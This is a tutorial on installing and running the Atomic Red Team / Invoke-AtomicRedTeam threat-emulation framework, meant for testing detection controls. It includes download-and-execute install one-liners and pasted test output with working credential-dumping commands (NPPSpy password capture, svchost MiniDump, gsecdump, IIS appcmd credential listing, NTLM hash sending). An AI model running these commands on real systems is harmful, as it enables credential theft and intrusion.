# Atomic RedTeam

<figure><img src="../.gitbook/assets/1674042770479.jpg" alt=""><figcaption></figcaption></figure>



**`Threat emulation` : is the controlled simulation of real attacker behavior inside a safe environment to test whether defenses (EDR/IDS, policies, and security teams) can detect and respond to attacks without risking production systems.**

**`Atomic Red Team`  : is an open-source collection of small, standalone “atomic” tests that map to MITRE ATT\&CK techniques. Each test is a simple, repeatable action designed to verify whether detection controls can spot a specific adversary behavior.**

**`Example`** : \
**Atomic test : run a credential-dumping command targeting LSASS memory.**\
**Goal : check whether the EDR/monitoring raises alerts for memory access or credential-exfiltration behavior**

**`Invoke-Atomic` :  is a PowerShell framework for developing and executing Atomic Red Team tests.**

***

## <mark style="color:purple;">**installation**</mark>&#x20;

<figure><img src="../.gitbook/assets/Screenshot (2168).png" alt=""><figcaption></figcaption></figure>

**`1- Execution policy Bypass`**&#x20;

```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
```

**`2-Installing Invoke AtomicRedTeam`**

{% embed url="https://github.com/redcanaryco/invoke-atomicredteam/wiki/Installing-Invoke-AtomicRedTeam" %}

```
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);Install-AtomicRedTeam
```

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 05-46-29 Installing Invoke AtomicRedTeam · redcanaryco_invoke-atomicredteam Wiki.png" alt=""><figcaption></figcaption></figure>

**`3-Install Execution Framework and Atomics Folder`**

```
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing);Install-AtomicRedTeam -getAtomics -Force
```

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 05-48-33 Installing Invoke AtomicRedTeam · redcanaryco_invoke-atomicredteam Wiki.png" alt=""><figcaption></figcaption></figure>

**`4-Import the Module`**

{% embed url="https://github.com/redcanaryco/invoke-atomicredteam/wiki/Import-the-Module" %}

```
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
```

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 05-50-13 Import the Module · redcanaryco_invoke-atomicredteam Wiki.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2169).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2170).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2171).png" alt=""><figcaption></figcaption></figure>

**`5-Testing`**

```
invoke-atomictest t1218 -ShowDetailsBrief
```

<figure><img src="../.gitbook/assets/Screenshot (2168) (1).png" alt=""><figcaption></figcaption></figure>

DONE!

***

## <mark style="color:purple;">Listing Atomics with Invoke-Atomic</mark>

<mark style="color:red;">**`1-Show Details Brief`**</mark>\
\
`-ShowDetailsBrief`  switch to list the tests available for a given technique number

```
//Example
# List atomic tests that can be run from the current platform (Windows,Linux,macOS)
Invoke-AtomicTest T1003 -ShowDetailsBrief
```

<figure><img src="../.gitbook/assets/Screenshot (2173).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2174).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2175).png" alt=""><figcaption></figcaption></figure>

As shown in the example, we extracted all the sub-techniques of **T1003 (OS Credential Dumping)**.

```
 // List all atomic tests regardless of which platform it can be executed from
Invoke-AtomicTest T1003 -ShowDetailsBrief -anyOS
```

<figure><img src="../.gitbook/assets/Screenshot (2177).png" alt=""><figcaption></figcaption></figure>

**If you would like to show details for all techniques, you can use "`All`" as the technique number.**

```
# List atomic tests that can be run from the current platform (Windows,Linux,macOS)
Invoke-AtomicTest All -ShowDetailsBrief

# List all atomic tests regardless of which platform it can be executed from
Invoke-AtomicTest -ShowDetailsBrief -anyOS
```

<figure><img src="../.gitbook/assets/Screenshot (2179).png" alt=""><figcaption></figcaption></figure>

<mark style="color:red;">**`2-Show Details (verbose)`**</mark>

`-ShowDetails` switch to show test details, including attack commands, input parameters, and prerequisites for a given technique number.

```
# List atomic tests that can be run from the current platform (Windows,Linux,macOS)
Invoke-AtomicTest T1003 -ShowDetails
```

```
// output
PS C:\Users\anasa\Desktop> Invoke-AtomicTest T1003 -ShowDetails
PathToAtomicsFolder = C:\AtomicRedTeam\atomics
                                                                                                                                                                                                                                        [********BEGIN TEST*******]                                                                                                                                                                                                             Technique: OS Credential Dumping T1003                                                                                                                                                                                                  Atomic Test Name: Gsecdump                                                                                                                                                                                                              Atomic Test Number: 1                                                                                                                                                                                                                   Atomic Test GUID: 96345bfc-8ae7-4b6a-80b7-223200f24ef9
Description: Dump credentials from memory using Gsecdump.
Upon successful execution, you should see domain\username's followed by two 32 character hashes.
If you see output that says "compat: error: failed to create child process", execution was likely blocked by Anti-Virus.  You will receive only error output if you do not run this test from an elevated context (run as administrator)If you see a message saying "The system cannot find the path specified", try using the get-prereq_commands to download and install Gsecdump first.                                                                                                                                                                                                                                                                                                                              Attack Commands:                                                                                                                                                                                                                        Executor: command_prompt                                                                                                                                                                                                                ElevationRequired: True                                                                                                                                                                                                                 Command:                                                                                                                                                                                                                                "#{gsecdump_exe}" -a
Command (with inputs):
"C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe" -a

Dependencies:                                                                                                                                                                                                                           Description: Gsecdump must exist on disk at specified location (C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe)                                                                                                              Check Prereq Command:                                                                                                                                                                                                                   if (Test-Path "#{gsecdump_exe}") {exit 0} else {exit 1}                                                                                                                                                                                 Check Prereq Command (with inputs):                                                                                                                                                                                                     if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe") {exit 0} else {exit 1}                                                                                                                                       Get Prereq Command:                                                                                                                                                                                                                     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12                                                                                                                                                         $parentpath = Split-Path "#{gsecdump_exe}"; $binpath = "$parentpath\gsecdump-v2b5.exe"                                                                                                                                                  IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)
if(Invoke-WebRequestVerifyHash "#{gsecdump_url}" "$binpath" #{gsecdump_bin_hash}){                                                                                                                                                        Move-Item $binpath "#{gsecdump_exe}"                                                                                                                                                                                                  }                                                                                                                                                                                                                                       Get Prereq Command (with inputs):                                                                                                                                                                                                       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12                                                                                                                                                         $parentpath = Split-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe"; $binpath = "$parentpath\gsecdump-v2b5.exe"                                                                                                        IEX(IWR "https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1" -UseBasicParsing)                                                                                            if(Invoke-WebRequestVerifyHash "https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe" "$binpath" 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC){                Move-Item $binpath "C:\AtomicRedTeam\atomics\..\ExternalPayloads\gsecdump.exe"                                                                                                                                                        }                                                                                                                                                                                                                                       [!!!!!!!!END TEST!!!!!!!]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               [********BEGIN TEST*******]                                                                                                                                                                                                             Technique: OS Credential Dumping T1003                                                                                                                                                                                                  Atomic Test Name: Credential Dumping with NPPSpy                                                                                                                                                                                        Atomic Test Number: 2                                                                                                                                                                                                                   Atomic Test GUID: 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6                                                                                                                                                                                  Description: Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy. After user's logging in cleartext password is saved in C:\NPPSpy.txt. Clean up deletes the files and reverses Registry changes. NPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy                                                                                                                                                                                                                                                                                                                                                                                                              Attack Commands:                                                                                                                                                                                                                        Executor: powershell                                                                                                                                                                                                                    ElevationRequired: True                                                                                                                                                                                                                 Command:                                                                                                                                                                                                                                Copy-Item "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"                                                                                                                                       $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER                                                                                                                       $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"                                                                                                                                                                                         Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue                                                                                                                                                          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore                                                                                                                                                 $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore                                                                                                                                 $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore                                                                                                  $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore                                                                                              $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore                               echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"                                                                                                                  Command (with inputs):                                                                                                                                                                                                                  Copy-Item "C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll" -Destination "C:\Windows\System32"                                                                                                                                  $path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER                                                                                                                       $UpdatedValue = $Path.PROVIDERORDER + ",NPPSpy"                                                                                                                                                                                         Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue                                                                                                                                                          $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore                                                                                                                                                 $rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore                                                                                                                                 $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Class" -Value 2 -ErrorAction Ignore                                                                                                  $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "Name" -Value NPPSpy -ErrorAction Ignore                                                                                              $rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\NPPSPY.dll" -ErrorAction Ignore                               echo "[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt"                                                                                                                                                                                                                                                                                                                                                          Cleanup Commands:                                                                                                                                                                                                                       Command:                                                                                                                                                                                                                                $cleanupPath = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER                                                                                                                $cleanupUpdatedValue = $cleanupPath.PROVIDERORDER                                                                                                                                                                                       $cleanupUpdatedValue = $cleanupUpdatedValue -replace ',NPPSpy',''                                                                                                                                                                       Set-ItemProperty -Path $cleanupPath.PSPath -Name "PROVIDERORDER" -Value $cleanupUpdatedValue                                                                                                                                            Remove-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy" -Recurse -ErrorAction Ignore                                                                                                                                         Remove-Item C:\NPPSpy.txt -ErrorAction Ignore                                                                                                                                                                                           Remove-Item C:\Windows\System32\NPPSpy.dll -ErrorAction Ignore                                                                                                                                                                                                                                                                                                                                                                                                                  Dependencies:                                                                                                                                                                                                                           Description: NPPSpy.dll must be available in ExternalPayloads directory                                                                                                                                                                 Check Prereq Command:                                                                                                                                                                                                                   if (Test-Path "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}                                                                                                                                              Check Prereq Command (with inputs):                                                                                                                                                                                                     if (Test-Path "C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll") {exit 0} else {exit 1}                                                                                                                                         Get Prereq Command:                                                                                                                                                                                                                     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12                                                                                                                                                         New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null                                                                                                                               Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "PathToAtomicsFolder\..\ExternalPayloads\NPPSPY.dll"                                  Get Prereq Command (with inputs):                                                                                                                                                                                                       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12                                                                                                                                                         New-Item -Type Directory "C:\AtomicRedTeam\atomics\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null                                                                                                                          Invoke-WebRequest -Uri https://github.com/gtworek/PSBits/raw/f221a6db08cb3b52d5f8a2a210692ea8912501bf/PasswordStealing/NPPSpy/NPPSPY.dll -OutFile "C:\AtomicRedTeam\atomics\..\ExternalPayloads\NPPSPY.dll"                             [!!!!!!!!END TEST!!!!!!!]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               [********BEGIN TEST*******]                                                                                                                                                                                                             Technique: OS Credential Dumping T1003                                                                                                                                                                                                  Atomic Test Name: Dump svchost.exe to gather RDP credentials                                                                                                                                                                            Atomic Test Number: 3                                                                                                                                                                                                                   Atomic Test GUID: d400090a-d8ca-4be0-982e-c70598a23de9                                                                                                                                                                                  Description: The svchost.exe contains the RDP plain-text credentials. Source: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/                                                                          Upon successful execution, you should see the following file created $env:TEMP\svchost-exe.dmp.                                                                                                                                                                                                                                                                                                                                                                                 Attack Commands:                                                                                                                                                                                                                        Executor: powershell                                                                                                                                                                                                                    ElevationRequired: True                                                                                                                                                                                                                 Command:                                                                                                                                                                                                                                $ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)                                                                                                                                                     if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }                                                                                                                                                           C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full                                                                                                                                                                                                                                                                                                                                                                   Cleanup Commands:                                                                                                                                                                                                                       Command:                                                                                                                                                                                                                                Remove-Item $env:TEMP\svchost-exe.dmp -ErrorAction Ignore                                                                                                                                                                               [!!!!!!!!END TEST!!!!!!!]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               [********BEGIN TEST*******]                                                                                                                                                                                                             Technique: OS Credential Dumping T1003                                                                                                                                                                                                  Atomic Test Name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using list)                                                                                                                                          Atomic Test Number: 4                                                                                                                                                                                                                   Atomic Test GUID: 6c7a4fd3-5b0b-4b30-a93e-39411b25d889                                                                                                                                                                                  Description: AppCmd.exe is a command line utility which is used for managing an IIS web server. The list command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes. [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)                                                                                                                                                                                                                                                                                                                                                Attack Commands:                                                                                                                                                                                                                        Executor: powershell                                                                                                                                                                                                                    ElevationRequired: True                                                                                                                                                                                                                 Command:                                                                                                                                                                                                                                C:\Windows\System32\inetsrv\appcmd.exe list apppool /@t:*                                                                                                                                                                               C:\Windows\System32\inetsrv\appcmd.exe list apppool /@text:*                                                                                                                                                                            C:\Windows\System32\inetsrv\appcmd.exe list apppool /text:*                                                                                                                                                                                                                                                                                                                                                                                                                     Dependencies:                                                                                                                                                                                                                           Description: IIS must be installed prior to running the test                                                                                                                                                                            Check Prereq Command:                                                                                                                                                                                                                   if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {exit 1}                                                                                                                                                Get Prereq Command:                                                                                                                                                                                                                     Install-WindowsFeature -name Web-Server -IncludeManagementTools                                                                                                                                                                         [!!!!!!!!END TEST!!!!!!!]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               [********BEGIN TEST*******]                                                                                                                                                                                                             Technique: OS Credential Dumping T1003                                                                                                                                                                                                  Atomic Test Name: Retrieve Microsoft IIS Service Account Credentials Using AppCmd (using config)                                                                                                                                        Atomic Test Number: 5                                                                                                                                                                                                                   Atomic Test GUID: 42510244-5019-48fa-a0e5-66c3b76e6049                                                                                                                                                                                  Description: AppCmd.exe is a command line utility which is used for managing an IIS web server. The config command within the tool reveals the service account credentials configured for the webserver. An adversary may use these credentials for other malicious purposes. [Reference](https://twitter.com/0gtweet/status/1588815661085917186?cxt=HHwWhIDUyaDbzYwsAAAA)                                                                                                      
Attack Commands:
Executor: powershell
ElevationRequired: True
Command:
C:\Windows\System32\inetsrv\appcmd.exe list apppool /config

Dependencies:
Description: IIS must be installed prior to running the test
Check Prereq Command:
if ((Get-WindowsFeature Web-Server).InstallState -eq "Installed") {exit 0} else {exit 1}
Get Prereq Command:
Install-WindowsFeature -name Web-Server -IncludeManagementTools
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Dump Credential Manager using keymgr.dll and rundll32.exe
Atomic Test Number: 6
Atomic Test GUID: 84113186-ed3c-4d0d-8a3c-8980c86c1f4a
Description: This test executes the exported function `KRShowKeyMgr` located in `keymgr.dll` using `rundll32.exe`. It opens a window that allows to export stored Windows credentials from the credential manager to a file (`.crd` by default). The file can then be retrieved and imported on an attacker-controlled computer to list the credentials get the passwords. The only limitation is that it requires a CTRL+ALT+DELETE input from the attacker, which can be achieve multiple ways (e.g. a custom implant with remote control capabilities, enabling RDP, etc.). Reference: https://twitter.com/0gtweet/status/1415671356239216653

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
rundll32.exe keymgr,KRShowKeyMgr
[!!!!!!!!END TEST!!!!!!!]


[********BEGIN TEST*******]
Technique: OS Credential Dumping T1003
Atomic Test Name: Send NTLM Hash with RPC Test Connection
Atomic Test Number: 7
Atomic Test GUID: 0b207037-813c-4444-ac3f-b597cf280a67
Description: RpcPing command can be used to send an RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.  Ref: https://twitter.com/vysecurity/status/974806438316072960

Attack Commands:
Executor: powershell
ElevationRequired: False
Command:
rpcping -s #{server_ip} -e #{custom_port} -a privacy -u NTLM 1>$Null
Command (with inputs):
rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM 1>$Null
[!!!!!!!!END TEST!!!!!!!]
```

**The output captured every sub-technique and extracted information about each, as you can see.**

***

## <mark style="color:purple;">Check or Get Prerequisites for Atomic Tests</mark>

**Each tactic’s `.yaml` file in Atomic Red Team includes a Description section that lists required preconditions (prerequisites): required binaries, privileges, services, or configuration changes needed for the atomic test to run correctly.**

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 20-12-51 atomic-red-team_atomics at master · redcanaryco_atomic-red-team.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 20-13-16 atomic-red-team_atomics_T1003 at master · redcanaryco_atomic-red-team.png" alt=""><figcaption></figcaption></figure>

* **Before executing a test use the provided prerequisite-check command (or the test’s built-in check). The check reads the `.yaml` description and verifies those conditions on the host.**
* **If the check returns `met` it means the prerequisites are satisfied and the test can be executed safely (environment, permissions, and dependencies are present).**
* **If the check returns not met / missing (or lists specific failures), do not run the test — instead install or enable the missing items (e.g., run as Administrator, install required tools, enable services, or adjust configuration) and re-run the check.**

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 20-14-31 atomic-red-team_atomics_T1003_T1003.yaml at master · redcanaryco_atomic-red-team.png" alt=""><figcaption></figcaption></figure>

To check if the system you are using meets the prerequisites required for each test, use the `-CheckPrereqs` switch before executing the test.

```
// By TestName
Invoke-AtomicTest T1003 -TestName "Credential Dumping with NPPSpy" -CheckPrereqs

// By TestNumber
Invoke-AtomicTest T1003 -TestNumber 2 -CheckPrereqs

// By GUID
Invoke-AtomicTest T1003 -TestGuids 9e2173c0-ba26-4cdf-b0ed-8c54b27e3ad6  -CheckPrereqs
```

Example : check Prereqs for Credential Dumping with NPPSpy (3-ways)

<figure><img src="../.gitbook/assets/Screenshot (2181).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2182).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2183).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2184).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2185).png" alt=""><figcaption></figcaption></figure>

To check the prerequisites for all atomic tests within a given technique number you can use the following command

```
Invoke-AtomicTest T1003 -CheckPrereqs
```

<figure><img src="../.gitbook/assets/Screenshot (2186).png" alt=""><figcaption></figcaption></figure>

If you find that your system does not meet the prerequisites, you can use the `-GetPrereqs` switch to attempt to satisfy those prerequisites as follows.

```
Invoke-AtomicTest T1003 -TestName "Credential Dumping with NPPSpy" -GetPrereqs
```

<figure><img src="../.gitbook/assets/Screenshot (2187).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2188).png" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">**Execute Atomic Tests (Local)**</mark>

When you run an atomic test locally, the runner doesn't guess it reads the `executor` section inside the test’s `.yaml` and follows it exactly. The `executor` defines **how** to run the test: the command or script, target platform (Windows/Linux/macOS), required privileges (e.g., admin/root), timeout, and any variables or arguments.

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 23-26-24 atomic-red-team_atomics_T1218_T1218.yaml at master · redcanaryco_atomic-red-team.png" alt=""><figcaption></figcaption></figure>

**Execute Specific Attacks (by Atomic Test Number) for a Given Technique**

```
Execute Single Test 

// By num
Invoke-AtomicTest T1218.010 -TestNumbers 1

// By Name 
Invoke-AtomicTest T1218.010 -TestNames "Regsvr32 remote COM scriptlet execution"

// By GUID
Invoke-AtomicTest T1003 -TestGuids 5c2571d0-1572-416d-9676-812e64ca9f44
-----------------------------------------------
Execute Pair Tests

 // By Num 
Invoke-AtomicTest T1218.010 -TestNumbers 1,2
# or using the short form ..
Invoke-AtomicTest T1218.010-1,2

// By Name
Invoke-AtomicTest T1218.010 -TestNames "Regsvr32 remote COM scriptlet execution","Regsvr32 local DLL execution"

// By GUID
Invoke-AtomicTest T1003 -TestGuids 5c2571d0-1572-416d-9676-812e64ca9f44,66fb0bc1-3c3f-47e9-a298-550ecfefacbc
---------------------------------------------------
Execute All Attacks for a Given Technique

Invoke-AtomicTest T1218.010
---------------------------------------------------
Execute All Tests

Invoke-AtomicTest All
---------------------------------------------------
```

Example ⇒ T1218.010

<figure><img src="../.gitbook/assets/Screenshot 2025-09-29 at 23-34-49 System Binary Proxy Execution Regsvr32 Sub-technique T1218.010 - Enterprise MITRE ATT&#x26;CK®.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2190).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2191).png" alt=""><figcaption></figcaption></figure>

for T1218.010 Test #1 the executor launches Calculator expected result: **calc opens** on the target machine. If calc doesn’t open, inspect the executor, permissions, and any blocked binaries.

<figure><img src="../.gitbook/assets/Screenshot (2193).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/Screenshot (2194).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://attack.mitre.org/techniques/T1218/010/" %}

***

## <mark style="color:purple;">Specify Custom Input Arguments</mark>

<figure><img src="../.gitbook/assets/Screenshot (2195).png" alt=""><figcaption></figcaption></figure>

Use the `-PromptForInputArgs` switch to set your own values for the input arguments used by the atomic test

```
Invoke-AtomicTest T1564.004 -TestNames "Create ADS command prompt" -PromptForInputArgs
```

Specify InputArg "chrome.exe"

<figure><img src="../.gitbook/assets/Screenshot (2196).png" alt=""><figcaption></figcaption></figure>

***



